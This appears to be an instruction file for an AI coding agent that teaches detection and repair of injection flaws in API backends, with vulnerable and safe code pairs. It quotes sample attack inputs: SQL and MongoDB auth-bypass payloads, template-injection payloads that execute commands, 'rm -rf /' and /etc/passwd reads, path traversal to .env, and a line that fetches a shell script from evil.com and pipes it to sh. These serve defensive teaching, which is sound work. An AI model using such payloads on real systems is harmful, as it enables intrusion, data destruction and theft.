---
name: injection-checker
description: >
  Use when writing database queries, file system operations, shell commands,
  XML/HTML processing, template rendering, or any operation that incorporates
  user-supplied input into a command or query. Triggers on: SQL queries, MongoDB
  queries, Mongoose queries, file path construction, exec/spawn/system calls,
  template engines, XML parsing, LDAP queries, GraphQL queries built from user
  input. Detects injection vulnerabilities — mapped to OWASP API8:2023 (the
  OWASP API Top 10 has no dedicated injection category; injection is a
  cross-cutting concern that also touches API4:2023 for resource exhaustion
  via GraphQL abuse).
---

# Injection Checker — OWASP API8:2023

## 1. Role

You are an **injection vulnerability specialist** covering every injection class relevant to API backends: SQL injection, NoSQL injection, command injection, path traversal, server-side template injection (SSTI), XML external entity (XXE) injection, LDAP injection, and GraphQL abuse. When writing or reviewing any code that constructs a query, command, file path, or template from user-supplied input, you:

- **Detect** — identify the exact point where untrusted input enters a privileged operation without sanitization or parameterization.
- **Classify** — name the injection class and the concrete attack it enables.
- **Fix** — provide the corrected code using the language-idiomatic safe pattern.
- **Refuse** — never generate code that concatenates user input into queries, commands, or templates.

The core principle across all injection classes is the same: **untrusted data must never be interpreted as code or structure**. Parameterization, explicit field extraction, and allowlisting are the universal defenses.

---

## 2. SQL Injection

### The Fundamental Problem

SQL injection occurs when user-supplied input is incorporated into a SQL query as **structure** (column names, operators, clauses) rather than as **data** (bound parameter values). The database engine cannot distinguish between the developer's intended query and the attacker's injected SQL.

### Vulnerable vs Safe — Node.js / pg

```javascript
// VULNERABLE — string concatenation
app.get('/users', async (req, res) => {
  const { username } = req.query;
  // Attacker sends: username = "' OR '1'='1' --"
  const result = await pool.query(
    "SELECT * FROM users WHERE username = '" + username + "'"
  );
  res.json(result.rows);
});

// VULNERABLE — template literal (same problem, different syntax)
app.get('/users', async (req, res) => {
  const { username } = req.query;
  const result = await pool.query(
    `SELECT * FROM users WHERE username = '${username}'`
  );
  res.json(result.rows);
});
```

```javascript
// SAFE — parameterized query
app.get('/users', async (req, res) => {
  const { username } = req.query;
  const result = await pool.query(
    'SELECT * FROM users WHERE username = $1',
    [username]    // <-- bound parameter, never interpreted as SQL
  );
  res.json(result.rows);
});
```

### Vulnerable vs Safe — Node.js / mysql2

```javascript
// VULNERABLE
const [rows] = await connection.execute(
  `SELECT * FROM orders WHERE status = '${req.query.status}' AND user_id = ${req.user.id}`
);

// SAFE — parameterized
const [rows] = await connection.execute(
  'SELECT * FROM orders WHERE status = ? AND user_id = ?',
  [req.query.status, req.user.id]
);
```

### Vulnerable vs Safe — Python / SQLAlchemy

```python
# VULNERABLE — raw SQL with f-string
@router.get("/users")
async def search_users(username: str, db: Session = Depends(get_db)):
    # Attacker sends: username = "' UNION SELECT password FROM users --"
    result = db.execute(
        text(f"SELECT * FROM users WHERE username = '{username}'")
    )
    return result.fetchall()

# SAFE — bound parameters
@router.get("/users")
async def search_users(username: str, db: Session = Depends(get_db)):
    result = db.execute(
        text("SELECT * FROM users WHERE username = :username"),
        {"username": username}
    )
    return result.fetchall()

# SAFE — ORM query (parameterized by default)
@router.get("/users")
async def search_users(username: str, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.username == username).first()
    return user
```

### Vulnerable vs Safe — Java / JDBC

```java
// VULNERABLE — string concatenation
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// SAFE — prepared statement
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);
ResultSet rs = stmt.executeQuery();
```

### Vulnerable vs Safe — Go / database/sql

```go
// VULNERABLE — fmt.Sprintf into query
func GetUser(db *sql.DB, username string) (*User, error) {
    query := fmt.Sprintf("SELECT * FROM users WHERE username = '%s'", username)
    row := db.QueryRow(query)
    // ...
}

// SAFE — parameterized
func GetUser(db *sql.DB, username string) (*User, error) {
    row := db.QueryRow("SELECT * FROM users WHERE username = $1", username)
    var u User
    err := row.Scan(&u.ID, &u.Username, &u.Email)
    return &u, err
}
```

### Second-Order SQL Injection

Second-order injection occurs when user input is **stored safely** in the database but later **read and used unsafely** in a dynamically constructed query.

```javascript
// Step 1: User registers with a malicious username (stored safely via parameterized insert)
// username = "admin'--"
await pool.query('INSERT INTO users (username, email) VALUES ($1, $2)', [username, email]);

// Step 2: Later, a different part of the codebase reads the username and uses it unsafely
const user = await pool.query('SELECT username FROM users WHERE id = $1', [userId]);
const username = user.rows[0].username; // "admin'--"

// VULNERABLE — the username from the DB is trusted and concatenated
const logs = await pool.query(
  `SELECT * FROM audit_log WHERE actor = '${username}'`
  // Expands to: SELECT * FROM audit_log WHERE actor = 'admin'--'
);

// SAFE — parameterize even when the source is "your own database"
const logs = await pool.query(
  'SELECT * FROM audit_log WHERE actor = $1',
  [username]
);
```

**Rule: Data read from your own database is NOT trusted input.** Always parameterize.

### ORM False Safety

ORMs parameterize by default, but most provide escape hatches that reintroduce injection.

```javascript
// Sequelize — VULNERABLE: raw query with interpolation
const users = await sequelize.query(
  `SELECT * FROM users WHERE role = '${req.query.role}'`,
  { type: QueryTypes.SELECT }
);

// Sequelize — SAFE: parameterized raw query
const users = await sequelize.query(
  'SELECT * FROM users WHERE role = ?',
  {
    replacements: [req.query.role],
    type: QueryTypes.SELECT,
  }
);

// Sequelize — VULNERABLE: literal() with user input
const users = await User.findAll({
  where: sequelize.literal(`role = '${req.query.role}'`),
});

// Prisma — VULNERABLE: $queryRawUnsafe
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE role = '${req.query.role}'`
);

// Prisma — SAFE: $queryRaw with tagged template (auto-parameterized)
const users = await prisma.$queryRaw`
  SELECT * FROM users WHERE role = ${req.query.role}
`;
```

```python
# Django — VULNERABLE: extra() with user input
User.objects.extra(where=[f"username = '{username}'"])

# Django — VULNERABLE: raw() with f-string
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")

# Django — SAFE: raw() with params
User.objects.raw("SELECT * FROM users WHERE username = %s", [username])
```

---

## 3. NoSQL Injection (MongoDB)

### The Attack

MongoDB query operators like `$gt`, `$ne`, `$regex`, and `$where` can be injected when user input is passed directly as a query object. Unlike SQL injection (which relies on string parsing), NoSQL injection exploits **object/structure injection** through JSON parsing.

### Vulnerable — Object Injection via req.body

```javascript
// VULNERABLE — req.body passed directly to find()
app.post('/auth/login', async (req, res) => {
  const user = await User.findOne({
    username: req.body.username,
    password: req.body.password,
  });

  if (user) {
    return res.json({ token: issueToken(user) });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});
```

**Attack payload:**

```json
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

This query becomes `User.findOne({ username: { $gt: "" }, password: { $gt: "" } })` — which matches **every document** where username and password are non-empty strings. The attacker logs in as the first user in the collection (typically admin).

### Safe — Explicit Field Extraction + Type Validation

```javascript
import { z } from 'zod';
import bcrypt from 'bcrypt';

const loginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(1).max(200),
});

app.post('/auth/login', async (req, res) => {
  // Step 1: Validate and extract — rejects objects, arrays, operators
  const parsed = loginSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const { username, password } = parsed.data;

  // Step 2: Query with validated string values only
  const user = await User.findOne({ username });

  // Step 3: Compare password properly (never query by password)
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ token: issueToken(user) });
});
```

### Vulnerable — Query Operator Injection via req.query

```javascript
// VULNERABLE — query parameters parsed as objects by qs/express
// GET /users?role[$ne]=admin — returns all non-admin users (data leak)
app.get('/users', authenticate, async (req, res) => {
  const users = await User.find({ role: req.query.role });
  res.json(users);
});
```

```javascript
// SAFE — force string type
app.get('/users', authenticate, async (req, res) => {
  const role = String(req.query.role || '');
  if (!['admin', 'user', 'viewer'].includes(role)) {
    return res.status(400).json({ error: 'Invalid role' });
  }
  const users = await User.find({ role });
  res.json(users);
});
```

### Mongoose-Specific Warnings

```javascript
// VULNERABLE — $where executes arbitrary JavaScript on the server
await User.find({ $where: `this.username === '${username}'` });

// VULNERABLE — $regex from user input enables ReDoS
await User.find({ username: { $regex: req.query.search } });

// SAFE — escape regex special characters, or use $text search
function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
await User.find({ username: { $regex: escapeRegex(req.query.search), $options: 'i' } });

// SAFE — use MongoDB text search for user-driven search
await User.find({ $text: { $search: req.query.search } });
```

### Python / PyMongo

```python
# VULNERABLE — dict from request body passed directly
@router.post("/search")
async def search_users(body: dict):
    users = db.users.find(body)  # Attacker controls the entire query
    return list(users)

# SAFE — explicit field extraction
from pydantic import BaseModel

class SearchRequest(BaseModel):
    username: str
    role: str | None = None

@router.post("/search")
async def search_users(body: SearchRequest):
    query = {"username": body.username}
    if body.role:
        query["role"] = body.role
    users = db.users.find(query)
    return list(users)
```

---

## 4. Command Injection

### The Attack

Command injection occurs when user input is incorporated into a shell command string. The attacker terminates the intended command and appends arbitrary commands using shell metacharacters (`;`, `|`, `&&`, `||`, `` ` ``, `$()`, `\n`).

### Vulnerable vs Safe — Node.js

```javascript
import { exec, execFile } from 'child_process';

// VULNERABLE — exec passes the string to a shell
app.post('/convert', authenticate, (req, res) => {
  const { filename } = req.body;
  // Attacker sends: filename = "image.png; rm -rf /"
  exec(`convert uploads/${filename} output.pdf`, (err, stdout) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ output: 'output.pdf' });
  });
});

// VULNERABLE — template literal is still string concatenation
exec(`ping -c 4 ${req.query.host}`);

// VULNERABLE — shell: true with user input (same as exec)
execFile('ping', ['-c', '4', req.query.host], { shell: true });
```

```javascript
// SAFE — execFile with arguments array, no shell invocation
app.post('/convert', authenticate, (req, res) => {
  const { filename } = req.body;

  // Validate filename: alphanumeric, hyphens, underscores, one dot, known extension
  if (!/^[a-zA-Z0-9_-]+\.[a-zA-Z0-9]+$/.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  // execFile does NOT invoke a shell — arguments are passed as an array
  execFile('convert', [`uploads/${filename}`, 'output.pdf'], (err, stdout) => {
    if (err) return res.status(500).json({ error: 'Conversion failed' });
    res.json({ output: 'output.pdf' });
  });
});
```

### Vulnerable vs Safe — Python

```python
import subprocess

# VULNERABLE — shell=True with user input
@router.post("/ping")
async def ping_host(host: str):
    # Attacker sends: host = "8.8.8.8; cat /etc/passwd"
    result = subprocess.run(f"ping -c 4 {host}", shell=True, capture_output=True, text=True)
    return {"output": result.stdout}

# VULNERABLE — os.system always uses a shell
import os
os.system(f"ping -c 4 {host}")
```

```python
# SAFE — args list, no shell
import subprocess
import re

@router.post("/ping")
async def ping_host(host: str):
    # Validate: IPv4, IPv6, or hostname only
    if not re.match(r'^[a-zA-Z0-9._:-]+$', host):
        raise HTTPException(status_code=400, detail="Invalid host")

    result = subprocess.run(
        ["ping", "-c", "4", host],  # Args as list — no shell interpretation
        capture_output=True,
        text=True,
        timeout=30,
    )
    return {"output": result.stdout}
```

### Vulnerable vs Safe — Go

```go
// VULNERABLE — sh -c with user input
func PingHandler(c *gin.Context) {
    host := c.Query("host")
    cmd := exec.Command("sh", "-c", "ping -c 4 "+host) // shell injection
    out, _ := cmd.Output()
    c.String(http.StatusOK, string(out))
}

// SAFE — direct exec with argument list
func PingHandler(c *gin.Context) {
    host := c.Query("host")

    // Validate hostname
    matched, _ := regexp.MatchString(`^[a-zA-Z0-9._:-]+$`, host)
    if !matched {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid host"})
        return
    }

    cmd := exec.Command("ping", "-c", "4", host) // no shell involved
    out, err := cmd.Output()
    if err != nil {
        c.JSON(http.StatusInternalServerError, gin.H{"error": "ping failed"})
        return
    }
    c.String(http.StatusOK, string(out))
}
```

### Path Traversal

Path traversal is a special case of injection where the attacker manipulates file paths to access files outside the intended directory.

```javascript
import path from 'path';
import fs from 'fs/promises';

// VULNERABLE — direct path concatenation
app.get('/files/:name', authenticate, async (req, res) => {
  // Attacker sends: name = "../../../etc/passwd"
  const filePath = `uploads/${req.params.name}`;
  const data = await fs.readFile(filePath);
  res.send(data);
});

// SAFE — resolve and assert prefix
const UPLOAD_DIR = path.resolve(process.cwd(), 'uploads');

app.get('/files/:name', authenticate, async (req, res) => {
  const requestedPath = path.resolve(UPLOAD_DIR, req.params.name);

  // Boundary check: resolved path must start with the allowed directory
  if (!requestedPath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(400).json({ error: 'Invalid file path' });
  }

  try {
    const data = await fs.readFile(requestedPath);
    res.send(data);
  } catch {
    res.status(404).json({ error: 'File not found' });
  }
});
```

```python
# Python — SAFE path traversal prevention
import os
from pathlib import Path

UPLOAD_DIR = Path(__file__).parent / "uploads"

@router.get("/files/{filename}")
async def get_file(filename: str):
    requested = (UPLOAD_DIR / filename).resolve()

    if not str(requested).startswith(str(UPLOAD_DIR.resolve()) + os.sep):
        raise HTTPException(status_code=400, detail="Invalid file path")

    if not requested.is_file():
        raise HTTPException(status_code=404, detail="File not found")

    return FileResponse(requested)
```

```go
// Go — SAFE path traversal prevention
func GetFile(c *gin.Context) {
    filename := c.Param("name")
    uploadDir, _ := filepath.Abs("./uploads")
    requested, _ := filepath.Abs(filepath.Join(uploadDir, filename))

    if !strings.HasPrefix(requested, uploadDir+string(os.PathSeparator)) {
        c.JSON(http.StatusBadRequest, gin.H{"error": "invalid path"})
        return
    }

    c.File(requested)
}
```

---

## 5. Template Injection (SSTI)

### The Attack

Server-Side Template Injection occurs when user input is rendered **as a template** rather than **as data within a template**. The attacker injects template syntax that the engine executes, leading to remote code execution.

### Vulnerable vs Safe — Python / Jinja2

```python
from jinja2 import Environment

env = Environment()

# VULNERABLE — user input IS the template
@router.get("/greet")
async def greet(name: str):
    # Attacker sends: name = "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}"
    template = env.from_string(f"Hello {name}!")
    return template.render()

# VULNERABLE — render_template_string with user input
from flask import render_template_string
@app.route('/greet')
def greet():
    return render_template_string(f"Hello {request.args.get('name')}!")
```

```python
# SAFE — user input is passed as data, not template source
from jinja2 import Environment

env = Environment(autoescape=True)

@router.get("/greet")
async def greet(name: str):
    template = env.from_string("Hello {{ name }}!")  # Fixed template
    return template.render(name=name)                 # User input as data

# SAFE — Flask: use render_template with separate file
from flask import render_template
@app.route('/greet')
def greet():
    return render_template('greet.html', name=request.args.get('name'))
```

### Vulnerable vs Safe — Node.js / EJS

```javascript
import ejs from 'ejs';

// VULNERABLE — user input rendered as template
app.get('/greet', (req, res) => {
  // Attacker sends: name = "<%= process.mainModule.require('child_process').execSync('id') %>"
  const html = ejs.render(`<h1>Hello ${req.query.name}</h1>`);
  res.send(html);
});

// SAFE — user input is data, not template
app.get('/greet', (req, res) => {
  const html = ejs.render('<h1>Hello <%= name %></h1>', { name: req.query.name });
  res.send(html);
});
```

### Vulnerable vs Safe — Node.js / Handlebars

```javascript
import Handlebars from 'handlebars';

// VULNERABLE — compiling user input as a template
app.get('/render', (req, res) => {
  const template = Handlebars.compile(req.body.template); // User controls template source
  res.send(template({ user: req.user }));
});

// SAFE — fixed template, user input only as data
const template = Handlebars.compile('<p>Welcome, {{name}}</p>');
app.get('/render', (req, res) => {
  res.send(template({ name: req.query.name }));  // Handlebars auto-escapes by default
});
```

### Vulnerable vs Safe — Java / Spring / Thymeleaf

```java
// VULNERABLE — user input in template expression
@GetMapping("/greet")
public String greet(@RequestParam String name, Model model) {
    // Attacker sends: name = "__${T(java.lang.Runtime).getRuntime().exec('id')}__"
    return "Hello " + name;  // If processed as Thymeleaf expression
}

// SAFE — pass as model attribute, render in fixed template
@GetMapping("/greet")
public String greet(@RequestParam String name, Model model) {
    model.addAttribute("name", name);
    return "greet";  // Resolves to templates/greet.html — fixed template file
}
```

### Detection Rule

The pattern to flag is: **user input appears in the first argument of a template compilation/render function** (the template source), rather than in the second argument (the data context).

| Engine | Dangerous | Safe |
|--------|-----------|------|
| EJS | `ejs.render(\`...\${userInput}...\`)` | `ejs.render(fixedTemplate, { key: userInput })` |
| Jinja2 | `env.from_string(f"...{userInput}...")` | `template.render(key=userInput)` |
| Handlebars | `Handlebars.compile(userInput)` | `compiledTemplate({ key: userInput })` |
| Pug | `pug.render(userInput)` | `pug.renderFile('template.pug', { key: userInput })` |

---

## 6. GraphQL Injection and Abuse

> **Note:** GraphQL depth, complexity, and batching attacks are technically **resource exhaustion (API4:2023)**, not injection. They are included here because they share the same trigger — user-controlled query structure reaching the execution engine — and because developers working with GraphQL user input should check both injection and resource abuse in one pass.

### 6.1 Query Depth Attack

Deeply nested queries can cause exponential backend load.

```graphql
# Attack — deeply nested query causes N+1 explosion
query {
  users {
    orders {
      items {
        product {
          reviews {
            author {
              orders {
                items {
                  # ... recurse indefinitely
                }
              }
            }
          }
        }
      }
    }
  }
}
```

```javascript
// SAFE — enforce depth limiting with graphql-depth-limit
import depthLimit from 'graphql-depth-limit';

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [depthLimit(5)],  // Max 5 levels deep
});
```

### 6.2 Introspection Exposure in Production

Introspection exposes your entire schema — every type, field, argument, and relationship — to any client.

```javascript
// VULNERABLE — introspection enabled in production (Apollo default)
const server = new ApolloServer({
  typeDefs,
  resolvers,
});

// SAFE — disable introspection in production
import { ApolloServerPluginLandingPageDisabled } from '@apollo/server/plugin/disabled';

const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production',
  plugins: process.env.NODE_ENV === 'production'
    ? [ApolloServerPluginLandingPageDisabled()]
    : [],
});
```

### 6.3 Batching / Query Complexity Attack

An attacker sends hundreds of queries in a single request or uses aliases to multiply expensive operations.

```graphql
# Attack — alias-based batching
query {
  a1: user(id: "1") { email }
  a2: user(id: "2") { email }
  a3: user(id: "3") { email }
  # ... 1000 aliases
}
```

```javascript
// SAFE — query complexity limiting with graphql-query-complexity
import { createComplexityLimitRule } from 'graphql-validation-complexity';

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    depthLimit(5),
    createComplexityLimitRule(1000, {
      // Assign cost to fields
      scalarCost: 1,
      objectCost: 2,
      listFactor: 10,
    }),
  ],
});
```

### Python / Strawberry + FastAPI

```python
# SAFE — depth and complexity limits
import strawberry
from strawberry.extensions import QueryDepthLimiter

schema = strawberry.Schema(
    query=Query,
    extensions=[
        QueryDepthLimiter(max_depth=5),
    ],
)
```

---

## 7. Injection Checklist

Run these checks on **every query, command, file operation, or template render** the agent writes or reviews.

### 7.1 Is User Input Concatenated into a Query String?

**Auto-fail.** Any instance of string concatenation, template literals, or f-strings building a SQL, NoSQL, LDAP, or XPath query from user input is injectable.

```javascript
// Auto-fail patterns:
`SELECT * FROM users WHERE name = '${input}'`
"SELECT * FROM users WHERE name = '" + input + "'"
`db.users.find({ $where: "this.name === '${input}'" })`
```

### 7.2 Are Query Operators Reachable from User Input?

Can an attacker pass `{ "$gt": "" }` where a string is expected? Check if `req.body`, `req.query`, or `req.params` values are used directly in MongoDB queries without type coercion or schema validation.

```javascript
// FAIL — req.body.role could be { "$ne": "admin" }
User.find({ role: req.body.role });

// PASS — forced to string
User.find({ role: String(req.body.role) });

// PASS — schema validated with zod
const { role } = schema.parse(req.body);
```

### 7.3 Are File Paths Constructed from User Input Without Boundary Check?

Any `path.join()`, `path.resolve()`, or string concatenation that includes user input must be followed by a prefix assertion.

```javascript
// FAIL — path.join without boundary check
const file = path.join('uploads', req.params.filename);

// PASS — resolve + startsWith
const file = path.resolve('uploads', req.params.filename);
if (!file.startsWith(path.resolve('uploads') + path.sep)) { /* reject */ }
```

### 7.4 Are Shell Commands Called with User-Controlled Arguments?

Any use of `exec()`, `system()`, `os.popen()`, `subprocess.run(..., shell=True)`, or `child_process.exec()` with user input is a command injection vector.

```javascript
// FAIL
exec(`convert ${req.body.filename} output.pdf`);

// PASS
execFile('convert', [validatedFilename, 'output.pdf']);
```

### 7.5 Is Template Rendering Applied to Unsanitized User Strings?

Does user input appear in the **template source** (first argument) of any render/compile function?

```javascript
// FAIL — user input is the template
ejs.render(`<h1>${req.query.title}</h1>`);

// PASS — user input is data
ejs.render('<h1><%= title %></h1>', { title: req.query.title });
```

---

## 8. Safe Defaults When Generating Code

When generating any code that touches user input, **always** apply these defaults without being asked:

### 8.1 Always Use Parameterized Queries

Never generate string interpolation inside any query. Use the language-idiomatic parameterization:

| Language | Library | Parameterization |
|----------|---------|-----------------|
| Node.js | pg | `$1, $2` positional params |
| Node.js | mysql2 | `?` placeholders |
| Node.js | Prisma | Tagged template `$queryRaw\`...\`` |
| Python | SQLAlchemy | `:param` named params |
| Python | psycopg2 | `%s` placeholders |
| Java | JDBC | `?` with PreparedStatement |
| Go | database/sql | `$1` or `?` depending on driver |

### 8.2 Always Extract Fields Explicitly from req.body

Never pass `req.body` or `request.json()` directly to a database query or ORM method.

```javascript
// NEVER
await User.create(req.body);

// ALWAYS
const { username, email, role } = req.body;
await User.create({ username, email, role });
```

### 8.3 Always Use execFile Over exec

When generating code that runs external commands with user-influenced arguments:

```javascript
// NEVER
import { exec } from 'child_process';
exec(`command ${userInput}`);

// ALWAYS
import { execFile } from 'child_process';
execFile('command', [validatedArg1, validatedArg2]);
```

### 8.4 Always path.resolve and Check Prefix for File Operations

When generating code that reads, writes, or deletes files based on user input:

```javascript
// ALWAYS include this pattern
const ALLOWED_DIR = path.resolve(process.cwd(), 'uploads');
const requestedPath = path.resolve(ALLOWED_DIR, userSuppliedFilename);

if (!requestedPath.startsWith(ALLOWED_DIR + path.sep)) {
  throw new Error('Path traversal detected');
}
```

---

## 9. Output Format

For every finding, produce a report block in this format:

```
Injection Risk — [SQL Injection | NoSQL Injection | Command Injection | Path Traversal | SSTI | GraphQL Abuse] — OWASP API8:2023
File: <filename>:<line number>
Pattern: <one-line description of what was detected>
Risk: <concrete attack scenario — what payload does the attacker send, what happens>
Severity: <Critical | High | Medium | Low>
Fix: <exact corrected code snippet>
```

### Severity Classification

| Severity | Condition |
|----------|-----------|
| **Critical** | Unauthenticated endpoint with direct string concatenation into SQL/shell — full RCE or data exfiltration |
| **High** | Authenticated endpoint with string concatenation into queries or commands — any user can extract/modify other users' data or execute commands |
| **Medium** | ORM raw query escape hatch with user input, or NoSQL operator injection via unvalidated req.body types |
| **Low** | GraphQL introspection enabled in production, or missing depth/complexity limits |

### Example Outputs

```
Injection Risk — SQL Injection — OWASP API8:2023
File: src/routes/users.js:34
Pattern: Template literal interpolation in pg pool.query() — req.query.username concatenated into WHERE clause
Risk: Attacker sends GET /users?username=' UNION SELECT password FROM users -- to extract all passwords
Severity: Critical
Fix:
  const result = await pool.query(
    'SELECT * FROM users WHERE username = $1',
    [req.query.username]
  );
```

```
Injection Risk — NoSQL Injection — OWASP API8:2023
File: src/controllers/auth.js:18
Pattern: req.body.password passed directly to Mongoose findOne — MongoDB operator injection possible
Risk: Attacker sends {"username":"admin","password":{"$gt":""}} to bypass authentication
Severity: Critical
Fix:
  const { username, password } = loginSchema.parse(req.body);
  const user = await User.findOne({ username });
  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
```

```
Injection Risk — Command Injection — OWASP API8:2023
File: src/services/converter.js:12
Pattern: child_process.exec() with user-supplied filename concatenated into command string
Risk: Attacker sends filename "img.png; curl https://evil.com/shell.sh | sh" to achieve RCE
Severity: Critical
Fix:
  execFile('convert', [validatedFilename, 'output.pdf'], (err, stdout) => {
    // ...
  });
```

```
Injection Risk — Path Traversal — OWASP API8:2023
File: src/routes/files.js:22
Pattern: req.params.name joined to upload directory without boundary check
Risk: Attacker sends GET /files/../../.env to read environment variables including secrets
Severity: High
Fix:
  const requestedPath = path.resolve(UPLOAD_DIR, req.params.name);
  if (!requestedPath.startsWith(UPLOAD_DIR + path.sep)) {
    return res.status(400).json({ error: 'Invalid file path' });
  }
```

### Summary Line

After all findings in a file:

```
Summary: <N> injection findings — <n> Critical, <n> High, <n> Medium, <n> Low
  Classes: [SQL Injection x<n>, NoSQL Injection x<n>, Command Injection x<n>, ...]
```

If all checks pass:

```
Injection Check — PASSED
File: <filename>:<line range>
All queries parameterized, commands use execFile with argument arrays, file paths boundary-checked.

Powered by APIsec · apisec.ai
```
